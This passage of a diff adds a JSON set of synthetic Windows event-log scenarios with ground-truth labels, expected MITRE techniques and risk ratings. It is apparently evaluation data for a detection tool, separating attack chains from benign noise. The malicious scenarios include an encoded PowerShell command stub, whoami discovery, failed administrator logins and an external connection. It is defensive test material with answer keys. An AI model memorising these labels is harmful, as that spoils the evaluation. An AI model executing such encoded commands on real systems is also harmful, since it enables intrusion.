+        "source": "WS-COMPROMISED",
+        "username": "alice",
+        "source_ip": "10.10.20.15",
+        "destination_ip": null,
+        "process": "powershell.exe",
+        "command_line": "powershell.exe -enc SQBFAFgA",
+        "message": "Suspicious PowerShell execution"
+      },
+      {
+        "timestamp": "2026-09-09T16:01:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-COMPROMISED",
+        "username": "alice",
+        "source_ip": "10.10.20.15",
+        "destination_ip": null,
+        "process": "cmd.exe",
+        "command_line": "cmd.exe /c whoami",
+        "message": "System owner discovery"
+      },
+      {
+        "timestamp": "2026-09-09T16:02:00Z",
+        "event_id": 5156,
+        "event_type": "Network Connection",
+        "source": "WS-COMPROMISED",
+        "username": "alice",
+        "source_ip": "10.10.20.15",
+        "destination_ip": "203.0.113.50",
+        "process": null,
+        "command_line": null,
+        "message": "External communication after discovery"
+      }
+    ]
+  },
+  {
+    "scenario_id": "A01",
+    "name": "Multi-Stage Attack Chain",
+    "ground_truth": "MALICIOUS",
+    "expected_attack": true,
+    "expected_techniques": [
+      "T1059.001",
+      "T1033",
+      "T1110",
+      "T1071"
+    ],
+    "expected_risk": "CRITICAL",
+    "events": [
+      {
+        "timestamp": "2026-09-09T17:00:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-ATTACK",
+        "username": "alice",
+        "source_ip": "10.10.20.15",
+        "destination_ip": null,
+        "process": "powershell.exe",
+        "command_line": "powershell.exe -enc SQBFAFgA",
+        "message": "Encoded PowerShell execution"
+      },
+      {
+        "timestamp": "2026-09-09T17:01:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-ATTACK",
+        "username": "alice",
+        "source_ip": "10.10.20.15",
+        "destination_ip": null,
+        "process": "cmd.exe",
+        "command_line": "cmd.exe /c whoami",
+        "message": "System discovery"
+      },
+      {
+        "timestamp": "2026-09-09T17:02:00Z",
+        "event_id": 4625,
+        "event_type": "Failed Login",
+        "source": "SRV-DC01",
+        "username": "administrator",
+        "source_ip": "10.10.20.99",
+        "destination_ip": null,
+        "process": null,
+        "command_line": null,
+        "message": "Authentication attack activity"
+      },
+      {
+        "timestamp": "2026-09-09T17:03:00Z",
+        "event_id": 5156,
+        "event_type": "Network Connection",
+        "source": "WS-ATTACK",
+        "username": "alice",
+        "source_ip": "10.10.20.15",
+        "destination_ip": "203.0.113.50",
+        "process": null,
+        "command_line": null,
+        "message": "External communication"
+      }
+    ]
+  },
+  {
+    "scenario_id": "A02",
+    "name": "Multi-Stage Attack Chain",
+    "ground_truth": "MALICIOUS",
+    "expected_attack": true,
+    "expected_techniques": [
+      "T1059.001",
+      "T1033",
+      "T1110",
+      "T1071"
+    ],
+    "expected_risk": "CRITICAL",
+    "events": [
+      {
+        "timestamp": "2026-09-09T17:00:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-ATTACK",
+        "username": "alice",
+        "source_ip": "10.10.20.15",
+        "destination_ip": null,
+        "process": "powershell.exe",
+        "command_line": "powershell.exe -enc SQBFAFgA",
+        "message": "Encoded PowerShell execution"
+      },
+      {
+        "timestamp": "2026-09-09T17:01:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-ATTACK",
+        "username": "alice",
+        "source_ip": "10.10.20.15",
+        "destination_ip": null,
+        "process": "cmd.exe",
+        "command_line": "cmd.exe /c whoami",
+        "message": "System discovery"
+      },
+      {
+        "timestamp": "2026-09-09T17:02:00Z",
+        "event_id": 4625,
+        "event_type": "Failed Login",
+        "source": "SRV-DC01",
+        "username": "administrator",
+        "source_ip": "10.10.20.99",
+        "destination_ip": null,
+        "process": null,
+        "command_line": null,
+        "message": "Authentication attack activity"
+      },
+      {
+        "timestamp": "2026-09-09T17:03:00Z",
+        "event_id": 5156,
+        "event_type": "Network Connection",
+        "source": "WS-ATTACK",
+        "username": "alice",
+        "source_ip": "10.10.20.15",
+        "destination_ip": "203.0.113.50",
+        "process": null,
+        "command_line": null,
+        "message": "External communication"
+      }
+    ]
+  },
+  {
+    "scenario_id": "A03",
+    "name": "Multi-Stage Attack Chain",
+    "ground_truth": "MALICIOUS",
+    "expected_attack": true,
+    "expected_techniques": [
+      "T1059.001",
+      "T1033",
+      "T1110",
+      "T1071"
+    ],
+    "expected_risk": "CRITICAL",
+    "events": [
+      {
+        "timestamp": "2026-09-09T17:00:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-ATTACK",
+        "username": "alice",
+        "source_ip": "10.10.20.15",
+        "destination_ip": null,
+        "process": "powershell.exe",
+        "command_line": "powershell.exe -enc SQBFAFgA",
+        "message": "Encoded PowerShell execution"
+      },
+      {
+        "timestamp": "2026-09-09T17:01:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-ATTACK",
+        "username": "alice",
+        "source_ip": "10.10.20.15",
+        "destination_ip": null,
+        "process": "cmd.exe",
+        "command_line": "cmd.exe /c whoami",
+        "message": "System discovery"
+      },
+      {
+        "timestamp": "2026-09-09T17:02:00Z",
+        "event_id": 4625,
+        "event_type": "Failed Login",
+        "source": "SRV-DC01",
+        "username": "administrator",
+        "source_ip": "10.10.20.99",
+        "destination_ip": null,
+        "process": null,
+        "command_line": null,
+        "message": "Authentication attack activity"
+      },
+      {
+        "timestamp": "2026-09-09T17:03:00Z",
+        "event_id": 5156,
+        "event_type": "Network Connection",
+        "source": "WS-ATTACK",
+        "username": "alice",
+        "source_ip": "10.10.20.15",
+        "destination_ip": "203.0.113.50",
+        "process": null,
+        "command_line": null,
+        "message": "External communication"
+      }
+    ]
+  },
+  {
+    "scenario_id": "A04",
+    "name": "Multi-Stage Attack Chain",
+    "ground_truth": "MALICIOUS",
+    "expected_attack": true,
+    "expected_techniques": [
+      "T1059.001",
+      "T1033",
+      "T1110",
+      "T1071"
+    ],
+    "expected_risk": "CRITICAL",
+    "events": [
+      {
+        "timestamp": "2026-09-09T17:00:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-ATTACK",
+        "username": "alice",
+        "source_ip": "10.10.20.15",
+        "destination_ip": null,
+        "process": "powershell.exe",
+        "command_line": "powershell.exe -enc SQBFAFgA",
+        "message": "Encoded PowerShell execution"
+      },
+      {
+        "timestamp": "2026-09-09T17:01:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-ATTACK",
+        "username": "alice",
+        "source_ip": "10.10.20.15",
+        "destination_ip": null,
+        "process": "cmd.exe",
+        "command_line": "cmd.exe /c whoami",
+        "message": "System discovery"
+      },
+      {
+        "timestamp": "2026-09-09T17:02:00Z",
+        "event_id": 4625,
+        "event_type": "Failed Login",
+        "source": "SRV-DC01",
+        "username": "administrator",
+        "source_ip": "10.10.20.99",
+        "destination_ip": null,
+        "process": null,
+        "command_line": null,
+        "message": "Authentication attack activity"
+      },
+      {
+        "timestamp": "2026-09-09T17:03:00Z",
+        "event_id": 5156,
+        "event_type": "Network Connection",
+        "source": "WS-ATTACK",
+        "username": "alice",
+        "source_ip": "10.10.20.15",
+        "destination_ip": "203.0.113.50",
+        "process": null,
+        "command_line": null,
+        "message": "External communication"
+      }
+    ]
+  },
+  {
+    "scenario_id": "A05",
+    "name": "Multi-Stage Attack Chain",
+    "ground_truth": "MALICIOUS",
+    "expected_attack": true,
+    "expected_techniques": [
+      "T1059.001",
+      "T1033",
+      "T1110",
+      "T1071"
+    ],
+    "expected_risk": "CRITICAL",
+    "events": [
+      {
+        "timestamp": "2026-09-09T17:00:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-ATTACK",
+        "username": "alice",
+        "source_ip": "10.10.20.15",
+        "destination_ip": null,
+        "process": "powershell.exe",
+        "command_line": "powershell.exe -enc SQBFAFgA",
+        "message": "Encoded PowerShell execution"
+      },
+      {
+        "timestamp": "2026-09-09T17:01:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-ATTACK",
+        "username": "alice",
+        "source_ip": "10.10.20.15",
+        "destination_ip": null,
+        "process": "cmd.exe",
+        "command_line": "cmd.exe /c whoami",
+        "message": "System discovery"
+      },
+      {
+        "timestamp": "2026-09-09T17:02:00Z",
+        "event_id": 4625,
+        "event_type": "Failed Login",
+        "source": "SRV-DC01",
+        "username": "administrator",
+        "source_ip": "10.10.20.99",
+        "destination_ip": null,
+        "process": null,
+        "command_line": null,
+        "message": "Authentication attack activity"
+      },
+      {
+        "timestamp": "2026-09-09T17:03:00Z",
+        "event_id": 5156,
+        "event_type": "Network Connection",
+        "source": "WS-ATTACK",
+        "username": "alice",
+        "source_ip": "10.10.20.15",
+        "destination_ip": "203.0.113.50",
+        "process": null,
+        "command_line": null,
+        "message": "External communication"
+      }
+    ]
+  },
+  {
+    "scenario_id": "N01",
+    "name": "Benign Activity With Security Noise",
+    "ground_truth": "BENIGN_WITH_NOISE",
+    "expected_attack": false,
+    "expected_techniques": [],
+    "expected_risk": "LOW",
+    "events": [
+      {
+        "timestamp": "2026-09-09T18:00:00Z",
+        "event_id": 4624,
+        "event_type": "Successful Login",
+        "source": "WS-OFFICE",
+        "username": "employee",
+        "source_ip": "10.10.10.50",
+        "destination_ip": null,
+        "process": null,
+        "command_line": null,
+        "message": "Successful user login"
+      },
+      {
+        "timestamp": "2026-09-09T18:01:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-OFFICE",
+        "username": "employee",
+        "source_ip": "10.10.10.50",
+        "destination_ip": null,
+        "process": "chrome.exe",
+        "command_line": "chrome.exe",
+        "message": "Normal browser activity"
+      },
+      {
+        "timestamp": "2026-09-09T18:02:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-OFFICE",
+        "username": "employee",
+        "source_ip": "10.10.10.50",
+        "destination_ip": null,
+        "process": "cmd.exe",
+        "command_line": "cmd.exe /c whoami",
+        "message": "Routine user identity check"
+      }
+    ]
+  },
+  {
+    "scenario_id": "N02",
+    "name": "Benign Activity With Security Noise",
+    "ground_truth": "BENIGN_WITH_NOISE",
+    "expected_attack": false,
+    "expected_techniques": [],
+    "expected_risk": "LOW",
+    "events": [
+      {
+        "timestamp": "2026-09-09T18:00:00Z",
+        "event_id": 4624,
+        "event_type": "Successful Login",
+        "source": "WS-OFFICE",
+        "username": "employee",
+        "source_ip": "10.10.10.50",
+        "destination_ip": null,
+        "process": null,
+        "command_line": null,
+        "message": "Successful user login"
+      },
+      {
+        "timestamp": "2026-09-09T18:01:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-OFFICE",
+        "username": "employee",
+        "source_ip": "10.10.10.50",
+        "destination_ip": null,
+        "process": "chrome.exe",
+        "command_line": "chrome.exe",
+        "message": "Normal browser activity"
+      },
+      {
+        "timestamp": "2026-09-09T18:02:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-OFFICE",
+        "username": "employee",
+        "source_ip": "10.10.10.50",
+        "destination_ip": null,
+        "process": "cmd.exe",
+        "command_line": "cmd.exe /c whoami",
+        "message": "Routine user identity check"
+      }
+    ]
+  },
+  {
+    "scenario_id": "N03",
+    "name": "Benign Activity With Security Noise",
+    "ground_truth": "BENIGN_WITH_NOISE",
+    "expected_attack": false,
+    "expected_techniques": [],
+    "expected_risk": "LOW",
+    "events": [
+      {
+        "timestamp": "2026-09-09T18:00:00Z",
+        "event_id": 4624,
+        "event_type": "Successful Login",
+        "source": "WS-OFFICE",
+        "username": "employee",
+        "source_ip": "10.10.10.50",
+        "destination_ip": null,
+        "process": null,
+        "command_line": null,
+        "message": "Successful user login"
+      },
+      {
+        "timestamp": "2026-09-09T18:01:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-OFFICE",
+        "username": "employee",
+        "source_ip": "10.10.10.50",
+        "destination_ip": null,
+        "process": "chrome.exe",
+        "command_line": "chrome.exe",
+        "message": "Normal browser activity"
+      },
+      {
+        "timestamp": "2026-09-09T18:02:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-OFFICE",
+        "username": "employee",
+        "source_ip": "10.10.10.50",
+        "destination_ip": null,
+        "process": "cmd.exe",
+        "command_line": "cmd.exe /c whoami",
+        "message": "Routine user identity check"
+      }
+    ]
+  },
+  {
+    "scenario_id": "N04",
+    "name": "Benign Activity With Security Noise",
+    "ground_truth": "BENIGN_WITH_NOISE",
+    "expected_attack": false,
+    "expected_techniques": [],
+    "expected_risk": "LOW",
+    "events": [
+      {
+        "timestamp": "2026-09-09T18:00:00Z",
+        "event_id": 4624,
+        "event_type": "Successful Login",
+        "source": "WS-OFFICE",
+        "username": "employee",
+        "source_ip": "10.10.10.50",
+        "destination_ip": null,
+        "process": null,
+        "command_line": null,
+        "message": "Successful user login"
+      },
+      {
+        "timestamp": "2026-09-09T18:01:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-OFFICE",
+        "username": "employee",
+        "source_ip": "10.10.10.50",
+        "destination_ip": null,
+        "process": "chrome.exe",
+        "command_line": "chrome.exe",
+        "message": "Normal browser activity"
+      },
+      {
+        "timestamp": "2026-09-09T18:02:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-OFFICE",
+        "username": "employee",
+        "source_ip": "10.10.10.50",
+        "destination_ip": null,
+        "process": "cmd.exe",
+        "command_line": "cmd.exe /c whoami",
+        "message": "Routine user identity check"
+      }
+    ]
+  },
+  {
+    "scenario_id": "N05",
+    "name": "Benign Activity With Security Noise",
+    "ground_truth": "BENIGN_WITH_NOISE",
+    "expected_attack": false,
+    "expected_techniques": [],
+    "expected_risk": "LOW",
+    "events": [
+      {
+        "timestamp": "2026-09-09T18:00:00Z",
+        "event_id": 4624,
+        "event_type": "Successful Login",
+        "source": "WS-OFFICE",
+        "username": "employee",
+        "source_ip": "10.10.10.50",
+        "destination_ip": null,
+        "process": null,
+        "command_line": null,
+        "message": "Successful user login"
+      },
+      {
+        "timestamp": "2026-09-09T18:01:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-OFFICE",
+        "username": "employee",
+        "source_ip": "10.10.10.50",
+        "destination_ip": null,
+        "process": "chrome.exe",
+        "command_line": "chrome.exe",
+        "message": "Normal browser activity"
+      },
+      {
+        "timestamp": "2026-09-09T18:02:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-OFFICE",
+        "username": "employee",
+        "source_ip": "10.10.10.50",
+        "destination_ip": null,
+        "process": "cmd.exe",
+        "command_line": "cmd.exe /c whoami",
+        "message": "Routine user identity check"
+      }
+    ]
+  }
+]
